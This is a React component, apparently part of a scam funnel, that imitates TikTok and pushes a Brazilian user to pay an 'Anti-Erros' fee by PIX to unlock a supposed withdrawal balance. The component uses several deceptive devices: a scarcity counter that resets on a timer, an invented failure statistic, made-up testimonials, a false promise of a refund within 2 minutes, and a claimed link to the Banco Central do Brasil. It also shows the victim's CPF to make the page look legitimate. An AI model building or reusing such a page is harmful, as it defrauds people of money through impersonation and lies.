import { useState, useEffect } from "react";
import { Loader2, AlertTriangle, Shield, CheckCircle2, Lock, Zap, ChevronRight } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";
import FunnelSecurityBadge from "./FunnelSecurityBadge";
import FunnelActiveUsersCounter from "./FunnelActiveUsersCounter";

interface FunnelUpsellAntiErrosProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="border border-gray-200 rounded-lg overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-2.5 text-left bg-white"><span className="text-gray-700 text-[11px] font-semibold">{question}</span><span className="text-gray-400 text-xs">{open ? "−" : "+"}</span></button>{open && <p className="px-2.5 pb-2.5 text-gray-500 text-[11px] leading-relaxed">{answer}</p>}</div>); };

const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiErrosProps) => {
  const [activationsLeft, setActivationsLeft] = useState(4);
  useEffect(() => { const interval = setInterval(() => setActivationsLeft(prev => (prev <= 1 ? 5 : prev - 1)), 20000); return () => clearInterval(interval); }, []);

  return (
    <div className="fixed inset-0 z-[80] bg-white overflow-y-auto">
      <div className="bg-[#FE2C55] py-2.5 flex justify-center"><img src={tiktokLogo} alt="TikTok" className="h-5 w-auto brightness-0 invert" /></div>
      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-6">
        {leadCpf && (<div className="bg-gray-50 rounded-lg p-2.5 flex items-center gap-2.5 border border-gray-200"><span className="text-sm">🪪</span><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[10px]">CPF: {leadCpf}</p></div><span className="text-emerald-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-red-50 border border-red-200 rounded-xl p-3"><div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⚠️ Risco de Falha</span></div><p className="text-gray-600 text-xs leading-relaxed"><strong className="text-gray-900">23% dos saques sem proteção falham</strong> por inconsistências de dados.</p></div>
        <div className="bg-red-600 rounded-lg px-3 py-2.5 flex items-center justify-center gap-2"><div className="relative"><div className="w-2 h-2 bg-white rounded-full" /><div className="absolute inset-0 w-2 h-2 bg-white rounded-full animate-ping" /></div><span className="text-white text-[11px] font-bold">⚠️ APENAS {activationsLeft} PROTEÇÕES DISPONÍVEIS</span></div>
        <div className="bg-gray-50 rounded-2xl p-4 border border-gray-200">
          <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Proteção Anti-Erros</span><span className="bg-emerald-100 text-emerald-700 text-[10px] font-bold px-2 py-0.5 rounded-full">72% OFF</span></div>
          <div className="flex items-baseline gap-2 mb-1"><span className="text-red-400 text-base line-through font-semibold">R$ 79,90</span><span className="text-gray-900 text-3xl font-extrabold">R$ 22,37</span></div>
          <p className="text-emerald-600 text-[11px] font-medium mb-1">✅ Reembolso em 2 min</p>
          <p className="text-red-500 text-[10px] font-semibold mb-4">❌ Sem proteção = risco de perda de {balance}</p>
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-base hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>{isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>PROTEGER MEU SAQUE<ChevronRight className="w-4 h-4" /></>)}</button>
          <FunnelSecurityBadge />
        </div>
        <FunnelActiveUsersCounter />
        <div className="space-y-2"><p className="text-gray-700 text-xs font-bold">Perguntas frequentes</p><FaqItem question="O que é Anti-Erros?" answer="Protocolo que corrige inconsistências entre CPF, chave PIX e dados bancários." /><FaqItem question="A taxa é reembolsável?" answer="Sim, 100%. Retorna em até 2 minutos." /></div>
        <div className="bg-gray-50 rounded-xl p-3 border border-gray-200"><p className="text-gray-700 text-xs font-bold mb-2.5 flex items-center gap-1.5"><CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" />Protegidos e sacaram</p><div className="space-y-2.5">{[{ img: testimonial1, name: "Renata S.", amount: "R$ 2.134", text: "A proteção corrigiu na hora!" }, { img: testimonial2, name: "Diego M.", amount: "R$ 3.671", text: "Sem a proteção ia perder." }, { img: testimonial3, name: "Juliana F.", amount: "R$ 1.892", text: "Em 3 min caiu tudo." }].map((t, i) => (<div key={i} className="flex items-center gap-2.5"><img src={t.img} alt="" className="w-7 h-7 rounded-full object-cover shrink-0" loading="lazy" /><div className="flex-1 min-w-0"><div className="flex items-center justify-between"><p className="text-gray-600 text-[11px] font-semibold">{t.name}</p><span className="text-emerald-600 text-[10px] font-bold">{t.amount} ✓</span></div><p className="text-gray-400 text-[10px] truncate">"{t.text}"</p></div></div>))}</div></div>
        <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-[15px] hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>{isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>ATIVAR PROTEÇÃO TOTAL<ChevronRight className="w-4 h-4" /></>)}</button>
        <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo DICT • Banco Central do Brasil</p>
      </main>
      <style>{`@keyframes ctaPulse { 0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(16,185,129,0.3); } 50% { transform: scale(1.02); box-shadow: 0 6px 25px rgba(16,185,129,0.5); } }`}</style>
    </div>
  );
};

export default FunnelUpsellAntiErros;
